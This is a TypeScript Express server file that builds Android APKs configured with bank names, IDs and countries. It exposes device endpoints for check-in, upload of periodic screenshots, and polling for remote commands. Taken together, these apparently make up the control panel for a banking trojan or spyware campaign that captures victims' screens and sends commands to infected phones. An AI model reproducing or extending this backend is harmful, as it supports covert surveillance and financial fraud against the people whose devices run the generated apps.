import "dotenv/config";
import express from "express";
import { createServer } from "http";
import net from "net";
import fs from "fs/promises";
import path from "path";
import { createExpressMiddleware } from "@trpc/server/adapters/express";
import { registerOAuthRoutes } from "./oauth";
import { appRouter } from "../routers";
import { createContext } from "./context";
import { serveStatic, setupVite } from "./vite";
import { setupWebSocket } from "../websocket";
import { getBuildJobById, resolveRuntimeApkConfig } from "../routers/apk";
import { generateAPK } from "../apk-generator";
import { ENV } from "./env";
import { getAdminUser, getUserByOpenId, upsertUser } from "../db";
import { createOrUpdateApp, createScreenshot } from "../corporate-db";
import { dequeueNextCommand } from "../remote-control-queue";

const LOCAL_AUTH_EMAIL = (process.env.LOCAL_AUTH_EMAIL ?? "admin@faztudo.com").trim().toLowerCase();
const SCREENSHOT_STORAGE_DIR = path.resolve(process.cwd(), "uploads", "screenshots");

function isPortAvailable(port: number): Promise<boolean> {
  return new Promise(resolve => {
    const server = net.createServer();
    server.listen(port, () => {
      server.close(() => resolve(true));
    });
    server.on("error", () => resolve(false));
  });
}

function stableNumericDeviceId(value: string): number {
  let hash = 0;
  for (let i = 0; i < value.length; i++) {
    hash = (hash * 31 + value.charCodeAt(i)) | 0;
  }

  const normalized = Math.abs(hash);
  return normalized === 0 ? 1 : normalized;
}

async function findAvailablePort(startPort: number = 3000): Promise<number> {
  for (let port = startPort; port < startPort + 20; port++) {
    if (await isPortAvailable(port)) {
      return port;
    }
  }
  throw new Error(`No available port found starting from ${startPort}`);
}

async function resolveDeviceOwner() {
  const ownerOpenId = ENV.ownerOpenId;
  const owner = ownerOpenId ? await getUserByOpenId(ownerOpenId) : undefined;
  const localOpenId = `local:${LOCAL_AUTH_EMAIL}`;
  let targetUser = owner ?? (await getUserByOpenId(localOpenId)) ?? (await getAdminUser());

  if (!owner && ownerOpenId) {
    console.warn(
      `[Device Checkin] OWNER_OPEN_ID '${ownerOpenId}' nao encontrado; usando fallback admin.`
    );
  }

  if (!targetUser) {
    await upsertUser({
      openId: localOpenId,
      email: LOCAL_AUTH_EMAIL,
      name: "admin",
      loginMethod: "local",
      role: "admin",
      lastSignedIn: new Date(),
    });

    targetUser = await getUserByOpenId(localOpenId);
  }

  if (!targetUser) {
    throw new Error("Nenhum usuario admin encontrado para vincular o dispositivo");
  }

  return targetUser;
}

function buildDeviceIdentity(rawPackageName: string, rawDeviceUid: string, rawDeviceName: string, rawModel: string) {
  const stableIdSeed = `${rawPackageName}:${rawDeviceUid}`;
  return {
    deviceId: stableNumericDeviceId(stableIdSeed),
    deviceName: rawDeviceName || rawModel || "Android Device",
  };
}

function extractClientIp(req: express.Request): string | undefined {
  const forwarded = req.headers["x-forwarded-for"];

  if (typeof forwarded === "string" && forwarded.trim()) {
    const first = forwarded.split(",")[0]?.trim();
    if (first) {
      return first.replace(/^::ffff:/, "");
    }
  }

  if (Array.isArray(forwarded) && forwarded.length > 0 && forwarded[0]) {
    return String(forwarded[0]).replace(/^::ffff:/, "");
  }

  const realIp = req.headers["x-real-ip"];
  if (typeof realIp === "string" && realIp.trim()) {
    return realIp.trim().replace(/^::ffff:/, "");
  }

  if (req.ip) {
    return req.ip.replace(/^::ffff:/, "");
  }

  const socketIp = req.socket?.remoteAddress;
  return socketIp ? socketIp.replace(/^::ffff:/, "") : undefined;
}

function extractCountryCode(req: express.Request): string | undefined {
  const candidate =
    req.headers["cf-ipcountry"] ??
    req.headers["x-vercel-ip-country"] ??
    req.headers["x-country-code"] ??
    req.headers["x-geo-country"];

  const code = Array.isArray(candidate) ? candidate[0] : candidate;
  if (typeof code !== "string") return undefined;

  const normalized = code.trim().toUpperCase();
  return /^[A-Z]{2}$/.test(normalized) ? normalized : undefined;
}

async function persistScreenshotImage(base64Payload: string, fileName: string) {
  const normalized = base64Payload.replace(/\s/g, "");
  const buffer = Buffer.from(normalized, "base64");
  await fs.mkdir(SCREENSHOT_STORAGE_DIR, { recursive: true });
  const absoluteFilePath = path.join(SCREENSHOT_STORAGE_DIR, fileName);
  await fs.writeFile(absoluteFilePath, buffer);
  return absoluteFilePath;
}

async function startServer() {
  const app = express();
  const server = createServer(app);
  app.set("trust proxy", 1);
  // Configure body parser with larger size limit for file uploads
  app.use(express.json({ limit: "50mb" }));
  app.use(express.urlencoded({ limit: "50mb", extended: true }));
  app.use("/uploads", express.static(path.resolve(process.cwd(), "uploads")));
  // OAuth callback under /api/oauth/callback
  registerOAuthRoutes(app);
  // tRPC API
  app.use(
    "/api/trpc",
    createExpressMiddleware({
      router: appRouter,
      createContext,
    })
  );

  app.get("/api/apk/download/:buildId/:fileName", async (req, res) => {
    const { buildId, fileName } = req.params;
    const job = getBuildJobById(buildId);

    if (buildId !== "demo" && (!job || job.status !== "completed")) {
      return res.status(404).json({
        success: false,
        message: "APK não encontrado ou ainda não finalizado",
      });
    }

    try {
      const safeFileName = fileName.endsWith(".apk") ? fileName : `${fileName}.apk`;

      // Gera APK real com as configurações do job
      const apkBuffer = await generateAPK({
        appName: job?.appName ?? "Demo Monitor",
        packageName: job?.packageName ?? "com.demo.monitor",
        versionName: job?.versionName ?? "1.0.0",
        versionCode: job?.versionCode ?? 1,
        logoUrl: job?.logoUrl,
        panelUrl: job?.panelUrl ?? "https://app.remotemonitor.com",
        bankId: job?.bankId ?? "default",
        bankCountry: job?.bankCountry ?? "BR",
        bankName: job?.bankName ?? "Default Bank",
      });

      res.setHeader("Content-Type", "application/vnd.android.package-archive");
      res.setHeader("Content-Disposition", `attachment; filename="${safeFileName}"`);
      res.setHeader("Content-Length", String(apkBuffer.length));
      res.setHeader("X-Artifact-Source", "local");

      return res.send(apkBuffer);
    } catch (error) {
      console.error("[APK Download] Erro ao gerar APK:", error);
      return res.status(500).json({
        success: false,
        message: "Erro ao gerar APK",
      });
    }
  });

  app.get("/api/apk/runtime-config", async (req, res) => {
    const packageName = typeof req.query.packageName === "string" ? req.query.packageName : undefined;
    const config = await resolveRuntimeApkConfig(packageName);

    if (!config) {
      if (!ENV.runtimePanelUrl) {
        return res.status(404).json({
          success: false,
          message: "Nenhum build concluido encontrado para configuracao runtime.",
        });
      }

      return res.json({
        success: true,
        config: {
          buildId: "runtime-fallback",
          panelUrl: ENV.runtimePanelUrl,
          appName: ENV.runtimeAppName,
          packageName: packageName || ENV.runtimePackageName,
          artifactSource: "github",
          createdAt: new Date(0).toISOString(),
          updatedAt: new Date().toISOString(),
        },
      });
    }

    return res.json({
      success: true,
      config,
    });
  });

  app.post("/api/device/checkin", async (req, res) => {
    try {
      const rawDeviceUid = typeof req.body?.deviceUid === "string" ? req.body.deviceUid : "";
      const rawPackageName = typeof req.body?.packageName === "string" ? req.body.packageName : "";
      const rawDeviceName = typeof req.body?.deviceName === "string" ? req.body.deviceName : "";
      const rawModel = typeof req.body?.model === "string" ? req.body.model : "Android";

      if (!rawDeviceUid || !rawPackageName) {
        return res.status(400).json({
          success: false,
          message: "deviceUid e packageName sao obrigatorios",
        });
      }

      const targetUser = await resolveDeviceOwner();
      const { deviceId, deviceName } = buildDeviceIdentity(
        rawPackageName,
        rawDeviceUid,
        rawDeviceName,
        rawModel,
      );
      const clientIp = extractClientIp(req);
      const countryCode = extractCountryCode(req);

      await createOrUpdateApp(
        deviceId,
        targetUser.id,
        deviceName,
        `agent.checkin.${rawPackageName}`,
        "corporate",
        true,
        0,
        {
          deviceName,
          model: rawModel,
          deviceUid: rawDeviceUid,
          packageName: rawPackageName,
          ipAddress: clientIp,
          countryCode,
        }
      );

      console.log(
        `[Device Checkin] success deviceUid=${rawDeviceUid} package=${rawPackageName} deviceId=${deviceId} userId=${targetUser.id}`
      );

      return res.json({
        success: true,
        deviceId,
        userId: targetUser.id,
      });
    } catch (error) {
      console.error("[Device Checkin] Failed:", error);
      const message = error instanceof Error ? error.message : "Falha ao registrar check-in do dispositivo";
      return res.status(500).json({
        success: false,
        message,
      });
    }
  });

  app.post("/api/device/screenshot", async (req, res) => {
    try {
      const rawDeviceUid = typeof req.body?.deviceUid === "string" ? req.body.deviceUid : "";
      const rawPackageName = typeof req.body?.packageName === "string" ? req.body.packageName : "";
      const rawDeviceName = typeof req.body?.deviceName === "string" ? req.body.deviceName : "";
      const rawModel = typeof req.body?.model === "string" ? req.body.model : "Android";
      const rawImageData = typeof req.body?.imageData === "string" ? req.body.imageData : "";

      if (!rawDeviceUid || !rawPackageName || !rawImageData) {
        return res.status(400).json({
          success: false,
          message: "deviceUid, packageName e imageData sao obrigatorios",
        });
      }

      const targetUser = await resolveDeviceOwner();
      const { deviceId, deviceName } = buildDeviceIdentity(
        rawPackageName,
        rawDeviceUid,
        rawDeviceName,
        rawModel,
      );
      const clientIp = extractClientIp(req);
      const countryCode = extractCountryCode(req);

      await createOrUpdateApp(
        deviceId,
        targetUser.id,
        deviceName,
        `agent.checkin.${rawPackageName}`,
        "corporate",
        true,
        0,
        {
          deviceName,
          model: rawModel,
          deviceUid: rawDeviceUid,
          packageName: rawPackageName,
          ipAddress: clientIp,
          countryCode,
        }
      );

      const matches = rawImageData.match(/^data:(image\/[a-zA-Z0-9.+-]+);base64,(.+)$/);
      const mimeType = matches?.[1] ?? "image/jpeg";
      const base64Payload = matches?.[2] ?? rawImageData;
      const extension = mimeType.includes("png") ? "png" : "jpg";
      const fileName = `${deviceId}-${Date.now()}.${extension}`;
      await persistScreenshotImage(base64Payload, fileName);
      const baseUrl = ENV.runtimePanelUrl || `${req.protocol}://${req.get("host")}`;
      const screenshotUrl = new URL(`/uploads/screenshots/${fileName}`, baseUrl).toString();

      await createScreenshot(
        deviceId,
        targetUser.id,
        screenshotUrl,
        Buffer.byteLength(base64Payload, "base64"),
        "automatic",
        "captura periodica do app"
      );

      return res.json({
        success: true,
        deviceId,
        screenshotUrl,
      });
    } catch (error) {
      console.error("[Device Screenshot] Failed:", error);
      const message = error instanceof Error ? error.message : "Falha ao registrar screenshot do dispositivo";
      return res.status(500).json({
        success: false,
        message,
      });
    }
  });

  app.get("/api/device/command/next", async (req, res) => {
    try {
      const rawDeviceUid = typeof req.query.deviceUid === "string" ? req.query.deviceUid : "";
      const rawPackageName = typeof req.query.packageName === "string" ? req.query.packageName : "";
      const rawDeviceName = typeof req.query.deviceName === "string" ? req.query.deviceName : "";
      const rawModel = typeof req.query.model === "string" ? req.query.model : "Android";

      if (!rawDeviceUid || !rawPackageName) {
        return res.status(400).json({
          success: false,
          message: "deviceUid e packageName sao obrigatorios",
        });
      }

      const targetUser = await resolveDeviceOwner();
      const { deviceId } = buildDeviceIdentity(
        rawPackageName,
        rawDeviceUid,
        rawDeviceName,
        rawModel,
      );

      const command = dequeueNextCommand(targetUser.id, deviceId);
      return res.json({
        success: true,
        deviceId,
        command,
      });
    } catch (error) {
      console.error("[Device Command] Failed:", error);
      const message = error instanceof Error ? error.message : "Falha ao buscar comando";
      return res.status(500).json({
        success: false,
        message,
      });
    }
  });

  // development mode uses Vite, production mode uses static files
  const isDevelopment = process.env.NODE_ENV !== "production";
  if (isDevelopment) {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }

  // Setup WebSocket
  setupWebSocket(server);
  console.log("[WebSocket] Server initialized");

  const preferredPort = parseInt(process.env.PORT || "3000");
  const port = await findAvailablePort(preferredPort);

  if (port !== preferredPort) {
    console.log(`Port ${preferredPort} is busy, using port ${port} instead`);
  }

  server.listen(port, () => {
    console.log(`Server running on http://localhost:${port}/`);
  });
}

startServer().catch(console.error);
